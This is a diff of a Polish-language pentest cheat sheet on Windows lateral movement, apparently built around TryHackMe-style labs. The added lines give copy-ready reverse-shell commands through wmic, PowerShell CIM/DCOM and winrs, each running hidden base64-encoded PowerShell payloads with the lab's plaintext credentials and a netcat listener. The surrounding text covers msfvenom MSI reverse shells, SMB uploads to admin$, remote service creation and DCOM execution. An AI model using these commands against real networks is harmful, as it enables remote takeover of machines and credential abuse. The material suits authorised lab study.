@@ -1814,7 +1814,14 @@ runas /netonly /user:za.tryhackme.com\t1_leonard.summers &quot;c:\tools\nc64.exe
 # 5. odpal usługę na nowym hoscie:
 sc.exe \\thmiis.za.tryhackme.com create thmservice-3249 binpath= &quot;%windir%\myservice.exe&quot; start= auto
 sc.exe \\thmiis.za.tryhackme.com start thmservice-3249 wmi — najprostsza forma (process call create) :: jednolinijkowiec (wmic, przestarzały ale wszędzie działa); returnvalue=0 = sukces, zwraca pid
-wmic /node:192.168.50.73 /user:jen /password:nexus123! process call create &quot;calc&quot; rpc na 135, dane sesji na 49152-65535. proces startuje w session 0. `wmic` przestarzały → preferuj metodę powershell cim/dcom poniżej. uac-remote nie dotyczy userów domenowych → masz pełne prawa do lateral. wmi + msi (135/5985, administrators) # 1. payload msi
+wmic /node:192.168.50.73 /user:jen /password:nexus123! process call create &quot;calc&quot;
+:: reverse shell — payload powershella zakodowany base64 (koder §7.1); listener nc -lvnp 443 przed:
+wmic /node:192.168.50.73 /user:jen /password:nexus123! process call create &quot;powershell -nop -w hidden -e jabjagwaaqbl...qaoacka&quot; rpc na 135, dane sesji na 49152-65535. proces startuje w session 0. `wmic` przestarzały → preferuj powershell cim/dcom poniżej. uac-remote nie dotyczy userów domenowych. **wmi reverse shell przez powershell (cim/dcom — nowoczesny odpowiednik):** $cred = new-object system.management.automation.pscredential(&#x27;corp\jen&#x27;,(convertto-securestring &#x27;nexus123!&#x27; -asplaintext -force))
+$opt  = new-cimsessionoption -protocol dcom
+$sess = new-cimsession -computername 192.168.50.73 -credential $cred -sessionoption $opt
+$b64  = &quot;jabjagwaaqblag4adaa...qaoacka&quot;     # reverse shell zakodowany (§7.1)
+invoke-cimmethod -cimsession $sess -classname win32_process -methodname create -arguments @{commandline=&quot;powershell -nop -w hidden -e $b64&quot;}
+# returnvalue 0 = sukces; złap shell na nc -lvnp 443 wmi + msi (135/5985, administrators) # 1. payload msi
 msfvenom -p windows/x64/shell_reverse_tcp lhost=$lhost lport=4444 -f msi &gt; myinstaller.msi
 # 2. upload
 smbclient -c &#x27;put myinstaller.msi&#x27; -u t1_corine.waters -w za &#x27;//thmiis.za.tryhackme.com/admin$/&#x27; korine.1994 na hoscie (powershell) — sesja wmi i instalacja: $username = &#x27;t1_corine.waters&#x27;;
@@ -1830,7 +1837,9 @@ impacket-atexec $domain/user:password@$ip whoami    # przez scheduled task power
 enter-pssession -computername 192.168.50.73 -credential $cred          # sesja interaktywna
 $sess = new-pssession -computername 192.168.50.73 -credential $cred
 invoke-command -session $sess -scriptblock { hostname; whoami }        # zdalne polecenie
-invoke-command -computername files04 -credential $cred -scriptblock { whoami } winrs (natywny klient winrm, cmd) winrs -r:files04 -u:jen -p:nexus123! &quot;cmd /c hostname &amp; whoami&quot; dcom (lateral przez 135, gdy winrm/smb odpadają) # a) mmc20.application — wykonaj polecenie zdalnie (bez podawania creds, użyje twojego tokenu):
+invoke-command -computername files04 -credential $cred -scriptblock { whoami } winrs (natywny klient winrm, cmd) winrs -r:files04 -u:jen -p:nexus123! &quot;cmd /c hostname &amp; whoami&quot;
+:: reverse shell — wklej zakodowany payload powershella (base64 z kodera §7.1); listener nc -lvnp 443 przed:
+winrs -r:files04 -u:jen -p:nexus123! &quot;powershell -nop -w hidden -e jabjagwaaqblag4adaagad0a...qblacgakqa=&quot; `winrs` działa tylko dla userów **domenowych** w grupie administrators lub remote management users (winrm 5985/5986). payload zakoduj koderem z §7.1 (utf-16le → base64). dcom (lateral przez 135, gdy winrm/smb odpadają) # a) mmc20.application — wykonaj polecenie zdalnie (bez podawania creds, użyje twojego tokenu):
 $dcom = [system.activator]::createinstance([type]::gettypefromprogid(&quot;mmc20.application.1&quot;,&quot;192.168.50.73&quot;))
 $dcom.document.activeview.executeshellcommand(&quot;cmd.exe&quot;,$null,&quot;/c calc.exe&quot;,&quot;7&quot;)
 # b) cim/dcom win32_process create (z creds — patrz $cred wyżej):
@@ -1870,8 +1879,17 @@ sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= &quot;%windir%\
 sc.exe \\thmiis.za.tryhackme.com start THMservice-3249</code></pre></div>
 <h4 class="leaf">WMI — najprostsza forma (process call create)</h4>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>:: jednolinijkowiec (wmic, przestarzały ale wszędzie działa); ReturnValue=0 = sukces, zwraca PID
-wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create &quot;calc&quot;</code></pre></div>
-<blockquote>RPC na 135, dane sesji na 49152-65535. Proces startuje w Session 0. <code>wmic</code> przestarzały → preferuj metodę PowerShell CIM/DCOM poniżej. UAC-remote NIE dotyczy userów domenowych → masz pełne prawa do lateral.</blockquote>
+wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create &quot;calc&quot;
+:: REVERSE SHELL — payload PowerShella zakodowany base64 (koder §7.1); listener nc -lvnp 443 PRZED:
+wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create &quot;powershell -nop -w hidden -e JABjAGwAaQBl...QAoACkA&quot;</code></pre></div>
+<blockquote>RPC na 135, dane sesji na 49152-65535. Proces startuje w Session 0. <code>wmic</code> przestarzały → preferuj PowerShell CIM/DCOM poniżej. UAC-remote NIE dotyczy userów domenowych.</blockquote>
+<p><strong>WMI reverse shell przez PowerShell (CIM/DCOM — nowoczesny odpowiednik):</strong></p>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>$cred = New-Object System.Management.Automation.PSCredential(&#x27;corp\jen&#x27;,(ConvertTo-SecureString &#x27;Nexus123!&#x27; -AsPlainText -Force))
+$Opt  = New-CimSessionOption -Protocol DCOM
+$Sess = New-CimSession -ComputerName 192.168.50.73 -Credential $cred -SessionOption $Opt
+$b64  = &quot;JABjAGwAaQBlAG4AdAA...QAoACkA&quot;     # reverse shell zakodowany (§7.1)
+Invoke-CimMethod -CimSession $Sess -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine=&quot;powershell -nop -w hidden -e $b64&quot;}
+# ReturnValue 0 = sukces; złap shell na nc -lvnp 443</code></pre></div>
 <h4 class="leaf">WMI + MSI (135/5985, Administrators)</h4>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code># 1. Payload MSI
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f msi &gt; myinstaller.msi
@@ -1897,7 +1915,10 @@ $sess = New-PSSession -ComputerName 192.168.50.73 -Credential $cred
 Invoke-Command -Session $sess -ScriptBlock { hostname; whoami }        # zdalne polecenie
 Invoke-Command -ComputerName files04 -Credential $cred -ScriptBlock { whoami }</code></pre></div>
 <h4 class="leaf">winrs (natywny klient WinRM, cmd)</h4>
-<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>winrs -r:files04 -u:jen -p:Nexus123! &quot;cmd /c hostname &amp; whoami&quot;</code></pre></div>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>winrs -r:files04 -u:jen -p:Nexus123! &quot;cmd /c hostname &amp; whoami&quot;
+:: REVERSE SHELL — wklej zakodowany payload PowerShella (base64 z kodera §7.1); listener nc -lvnp 443 PRZED:
+winrs -r:files04 -u:jen -p:Nexus123! &quot;powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0A...QBlACgAKQA=&quot;</code></pre></div>
+<blockquote><code>winrs</code> działa tylko dla userów <strong>domenowych</strong> w grupie Administrators lub Remote Management Users (WinRM 5985/5986). Payload zakoduj koderem z §7.1 (UTF-16LE → base64).</blockquote>
 <h4 class="leaf">DCOM (lateral przez 135, gdy WinRM/SMB odpadają)</h4>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code># a) MMC20.Application — wykonaj polecenie zdalnie (bez podawania creds, użyje Twojego tokenu):
 $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.50.73&quot;))
